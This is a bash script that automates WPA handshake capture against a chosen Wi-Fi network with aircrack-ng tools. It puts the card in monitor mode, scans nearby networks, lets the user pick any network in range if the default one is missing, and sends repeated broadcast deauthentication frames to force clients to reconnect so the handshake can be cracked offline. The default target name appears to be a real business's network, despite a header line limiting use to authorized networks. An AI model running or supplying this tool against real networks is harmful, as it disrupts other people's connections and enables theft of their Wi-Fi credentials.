#!/usr/bin/env bash
# quick-capture.sh - one-shot automated handshake capture for ONE target SSID.
# Deletes existing cap-* files for that target, re-captures, verifies.
# Use ONLY on networks you own / are authorized to test.
set -uo pipefail

IFACE="${1:-wlp2s0}"
SSID="${2:-KKOCHI SAMGYUP - 2.4G}"
OUT="/root/lab"
CAPSECS="${3:-45}"

red(){ printf "\033[1;31m%s\033[0m\n" "$*"; }
green(){ printf "\033[1;32m%s\033[0m\n" "$*"; }
yellow(){ printf "\033[1;33m%s\033[0m\n" "$*"; }

[[ $EUID -eq 0 ]] || { red "[!] run with sudo: sudo $0 $*"; exit 1; }
need(){ hash "$1" 2>/dev/null || { red "missing: $1"; exit 1; }; }
need aircrack-ng; need airodump-ng; need aireplay-ng; need tcpdump

MON_IF=""
MON_METHOD=""
cleanup(){
    pkill -f "airodump-ng -w $OUT/cap-${SSID// /_}" 2>/dev/null || true
    pkill -f "aireplay-ng" 2>/dev/null || true
    if [[ -n "$MON_IF" ]]; then
        if [[ "$MON_METHOD" == "iw" ]]; then
            ip link set "$MON_IF" down >/dev/null 2>&1 || true
            iw dev "$MON_IF" set type managed >/dev/null 2>&1 || true
            ip link set "$MON_IF" up >/dev/null 2>&1 || true
        else
            airmon-ng stop "$MON_IF" >/dev/null 2>&1 || true
        fi
    fi
    rfkill unblock wifi >/dev/null 2>&1 || true
    service NetworkManager restart >/dev/null 2>&1 || systemctl restart NetworkManager >/dev/null 2>&1 || true
    sleep 3
    nmcli radio wifi on >/dev/null 2>&1 || true
    ip link set "$IFACE" up >/dev/null 2>&1 || true
    nmcli device connect "$IFACE" >/dev/null 2>&1 || true
    green "[+] NetworkManager restored."
}
trap cleanup EXIT

SAFEID="${SSID//[^A-Za-z0-9]/_}"

echo "== Cleaning old captures for '$SSID'"
rm -f "$OUT"/cap-*.cap "$OUT"/cap-*.csv "$OUT"/cap-*.log.csv "$OUT"/cap-*.kismet.* "$OUT"/${SAFEID}_rc* 2>/dev/null
ls -1 "$OUT"/cap-* 2>/dev/null | wc -l | xargs echo "   remaining cap files:"

echo "== Entering monitor mode on $IFACE (direct iw: mt7921e drops data frames on airmon vif)"
airmon-ng check kill >/dev/null 2>&1
# rtw88-family USB cards go deaf in monitor after interface churn; reload clears it
RTW_RELOADED=0
DRV="$(basename "$(readlink "/sys/class/net/$IFACE/device/driver" 2>/dev/null)" 2>/dev/null)"
case "${DRV:-}" in
    rtw_8821au|rtw_8812au|rtw_8814au|rtw88_8821au|rtw88_8812au|rtw88_8814au)
        echo "   reloading $DRV to clear the rtw88 USB RX stall..."
        nmcli device set "$IFACE" managed no >/dev/null 2>&1 || true
        ip link set "$IFACE" down >/dev/null 2>&1 || true
        for pass in 1 2 3 4 5; do
            for m in $(ls /sys/module 2>/dev/null | grep -E '^(rtw88_|rtw_)' | tr '\n' ' '); do
                rmmod "$m" >/dev/null 2>&1 || true
            done
        done
        modprobe "$DRV" >/dev/null 2>&1
        sleep 3
        ip link set "$IFACE" up >/dev/null 2>&1 || true
        RTW_RELOADED=1
        ;;
esac
iw dev "$IFACE" set power_save off 2>/dev/null || true
ip link set "$IFACE" down
iw dev "$IFACE" set type monitor 2>/dev/null
ip link set "$IFACE" up
MON_METHOD="iw"
sleep 2
MON_IF="$IFACE"
ip link set "$MON_IF" up 2>/dev/null
# rtw88-family USB cards stay asleep in monitor unless power-save is off
iw dev "$MON_IF" set power_save off 2>/dev/null || true
green "   monitor iface: $MON_IF"

# Scan for busiest channel; also doubles as RX sanity (beacons visible => RX works)
echo "== RX sanity + busiest-channel scan (10s, airodump)"
rm -f /tmp/qcch-01.csv /tmp/qcch.log
airodump-ng --band bg -w /tmp/qcch --output-format csv "$MON_IF" >/tmp/qcch.log 2>&1 &
CHPID=$!; sleep 10; kill "$CHPID" 2>/dev/null; wait "$CHPID" 2>/dev/null
FR="$(awk -F, 'NR>2 && $1 ~ /:/{n++} END{print n+0}' /tmp/qcch-01.csv 2>/dev/null)"
if [[ "$FR" -eq 0 ]]; then
    red "[-] Saw 0 APs - monitor RX broken on this card. Try the AP-lab flow instead."
    exit 1
fi
green "   RX OK ($FR APs visible)"

# Capture on that channel with airodump (fixed chan; iw set channel makes
# mt7921e go deaf, so never use it after a scan)
bestch="$(awk -F, 'NR>2 && $1 ~ /:/{gsub(/ /,"",$4); if($4!="") c[$4]++} END{for(ch in c) if(c[ch]>=bestc){bestc=c[ch];best=ch} print best}' /tmp/qcch-01.csv 2>/dev/null)"
[[ -n "$bestch" ]] || bestch=6
echo "== DATA-frame probe: 8s on ch$bestch (busiest neighbor channel)"
base="/tmp/qcdata-$$"
rm -f "${base}"-01.cap "${base}"-01.csv
airodump-ng --band bg -c "$bestch" -w "$base" --output-format pcap "$MON_IF" >/dev/null 2>&1 &
CPID=$!; sleep 8; kill "$CPID" 2>/dev/null; wait "$CPID" 2>/dev/null
pcap="${base}-01.cap"
if command -v tshark >/dev/null 2>&1; then
    tot="$(tshark -r "$pcap" 2>/dev/null | wc -l)"
    data="$(tshark -r "$pcap" -Y 'wlan.fc.type eq 2' 2>/dev/null | wc -l)"
else
    tot="$(tcpdump -r "$pcap" -e 2>/dev/null | wc -l)"
    data="$(tcpdump -r "$pcap" -e 2>/dev/null | grep -c '802.11 data' || true)"
fi
rm -f "$pcap" "${base}"-01.csv
if [[ "${data:-0}" -gt 0 ]]; then
    green "   DATA-RX OK ($data data frames / $tot total on ch$bestch) - EAPOL capture viable"
else
    red "   DATA-RX BROKEN ($tot frames, 0 data on ch$bestch)."
    red "   This card drops unicast data frames; cannot capture handshakes."
    red "   Use the hwsim lab (option 8) or a monitor-capable USB adapter."
    exit 1
fi

echo "== Scanning 12s for networks in range"
rm -f /tmp/qcscan-*
airodump-ng --band bg -w /tmp/qcscan --output-format csv "$MON_IF" >/dev/null 2>&1 &
APID=$!; sleep 12; kill "$APID" 2>/dev/null; wait "$APID" 2>/dev/null

declare -a S_BSSID=() S_CH=() S_ESSID=() S_PWR=()
while IFS= read -r line; do
    [[ "$line" == *"Station MAC"* ]] && break
    [[ "$line" =~ ^[0-9A-Fa-f:]{17} ]] || continue
    S_BSSID+=("$(echo "$line" | cut -d, -f1 | tr -d ' ')")
    S_CH+=("$(echo "$line" | cut -d, -f4 | tr -d ' ')")
    S_PWR+=("$(echo "$line" | cut -d, -f9 | tr -d ' ')")
    S_ESSID+=("$(echo "$line" | cut -d, -f14 | tr -d ' ')")
done < /tmp/qcscan-01.csv

if [[ ${#S_BSSID[@]} -eq 0 ]]; then
    red "[-] No networks seen. Move closer / check antenna, or use AP-lab flow."
    exit 1
fi

yellow "   Found ${#S_BSSID[@]} network(s):"
for i in "${!S_BSSID[@]}"; do
    printf "     %2d) %-18s ch %-4s %-4s '%s'\n" "$((i+1))" "${S_BSSID[$i]}" "${S_CH[$i]}" "${S_PWR[$i]}dBm" "${S_ESSID[$i]:-<hidden>}"
done

BSSID=""; CH=""
# auto-pick if requested SSID was found
for i in "${!S_ESSID[@]}"; do
    [[ "${S_ESSID[$i]}" == "$SSID" ]] || continue
    BSSID="${S_BSSID[$i]}"; CH="${S_CH[$i]}"
    green "   '$SSID' found -> $BSSID ch $CH"
    break
done

if [[ -z "$BSSID" ]]; then
    red "[-] '$SSID' not seen."
    read -r -p "[>] Pick a network number from the list: " pick
    [[ "$pick" =~ ^[0-9]+$ ]] && [[ "$pick" -ge 1 ]] && [[ "$pick" -le ${#S_BSSID[@]} ]] || { red "bad choice"; exit 1; }
    BSSID="${S_BSSID[$((pick-1))]}"
    CH="${S_CH[$((pick-1))]}"
    SSID="${S_ESSID[$((pick-1))]}"
    green "   target: $BSSID ch $CH '$SSID'"
fi

echo "== Capturing handshake (${CAPSECS}s) -> $OUT/cap-<time>-01.cap"
page=$(date +%H%M%S)
airodump-ng -c "$CH" --bssid "$BSSID" -w "$OUT/cap-$page" "$MON_IF" >/dev/null 2>&1 &
DUMP_PID=$!
sleep 4

OK=0
for i in $(seq 1 $((CAPSECS/5))); do
    if [[ $((i % 2)) -eq 1 ]]; then
        echo "   [$((i*5))s] deauth-3 (broadcast)"
        aireplay-ng -0 3 -a "$BSSID" "$MON_IF" >/dev/null 2>&1 || true
    fi
    sleep 5
    if aircrack-ng "$OUT/cap-$page-01.cap" 2>/dev/null | grep -q 'WPA ([1-9]'; then
        OK=1; yellow "   real handshake seen at ${i}x5s"; break
    fi
done
kill "$DUMP_PID" 2>/dev/null; wait "$DUMP_PID" 2>/dev/null

echo "== Result"
if [[ $OK -eq 1 ]]; then
    green "[+] HANDSHAKE CAPTURED: $OUT/cap-$page-01.cap"
    aircrack-ng "$OUT/cap-$page-01.cap" | grep -E 'WPA \([1-9]' || true
else
    red "[-] No handshake in ${CAPSECS}s (final check: $(aircrack-ng "$OUT/cap-$page-01.cap" 2>/dev/null | grep -c 'WPA ([1-9]') valid)."
    yellow "    Causes: no client connected to AP, client farther than AP, or weak monitor RX."
    yellow "    -> connect a device (phone) to '$SSID' first, move closer, re-run:"
    yellow "    sudo $0 $IFACE '$SSID' 90"
    if command -v tshark >/dev/null; then
        yellow "    EAPOL frames seen in capture: $(tshark -r "$OUT/cap-$page-01.cap" -Y eapol 2>/dev/null | wc -l)"
    fi
fi